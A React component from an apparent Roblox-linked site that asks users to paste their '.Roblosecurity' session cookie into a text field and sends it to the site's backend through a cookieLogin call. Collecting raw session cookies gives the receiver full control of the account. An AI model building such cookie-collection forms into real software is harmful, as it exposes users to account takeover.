import React, { ChangeEvent, useState } from 'react'
import InputWithLabel from '../base/InputWithLabel'
import Submit from './Submit'
import { cookieLogin } from '../../services/auth/auth'
import { getToast } from '../../helpers/toast'

const RobloSignIn = ({ submitFunction, onClose }: { submitFunction?: Function, onClose: Function }) => {
  const [cookie, setInputValue] = useState('')

  const onChange = (event: ChangeEvent<HTMLInputElement>) => {
    setInputValue(event.target.value)
  }

  const onSubmit = async () => {
    if (!cookie) return getToast('Empty field not allowed', 'error')
    const { data } = await cookieLogin({ cookie })
    getToast(data?.message, 'success')
    onClose()
  }
  return (
    <>
      <div className='pb-6'>
        <InputWithLabel
          type='text'
          label='.Roblosecurity'
          value={cookie}
          placeholder="..."
          onChange={onChange}
        />
        <Submit
          titleBtn='Link'
          submitFunction={onSubmit}
        />
      </div>
    </>

  )
}
export default RobloSignIn
